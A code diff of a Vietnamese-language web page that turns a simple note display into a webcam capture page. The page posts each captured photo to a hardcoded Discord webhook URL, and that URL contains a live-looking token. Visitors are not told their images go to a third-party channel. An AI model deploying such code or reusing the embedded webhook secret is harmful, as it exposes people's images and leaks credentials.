@@ -3,48 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mở Ghi Chú</title>
+    <title>Chụp Ảnh và Gửi qua Webhook</title>
     <style>
         body {
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
             height: 100vh;
             background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
         }
-        #computer {
-            width: 200px;
-            height: 150px;
-            background-color: #ccc;
+        video {
+            width: 320px;
+            height: 240px;
             border: 2px solid #666;
-            border-radius: 8px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
         }
-        #note {
+        canvas {
             display: none;
-            margin-top: 20px;
-            padding: 10px;
-            border: 1px solid #666;
-            background-color: #fff;
-            border-radius: 5px;
         }
     </style>
 </head>
 <body>
-    <div id="computer">Nhấn vào máy tính</div>
-    <div id="note">Đây là một ghi chú!</div>
+    <h1>Chụp Ảnh</h1>
+    <video id="video" autoplay></video>
+    <button id="capture">Chụp Ảnh</button>
+    <canvas id="canvas"></canvas>
 
     <script>
-        const computer = document.getElementById('computer');
-        const note = document.getElementById('note');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureButton = document.getElementById('capture');
 
-        computer.addEventListener('click', () => {
-            note.style.display = 'block';
+        // Khởi động camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("Lỗi truy cập camera: ", err);
+            });
+
+        // Chụp ảnh
+        captureButton.addEventListener('click', () => {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+
+            // Chuyển đổi ảnh thành data URL
+            const imageData = canvas.toDataURL('image/png');
+
+            // Gửi ảnh qua webhook
+            sendImageToWebhook(imageData);
         });
+
+        // Hàm gửi ảnh qua webhook
+        function sendImageToWebhook(imageData) {
+            fetch('https://discord.com/api/webhooks/1295745366435561503/Zo_XHN4YlWh3T_eTzGXS94Z06Kse57GXw36d3qpiuvgITnml65RZrYlg6OO-q01348Ao', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ image: imageData }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Thành công:', data);
+            })
+            .catch((error) => {
+                console.error('Lỗi:', error);
+            });
+        }
     </script>
 </body>
 </html>
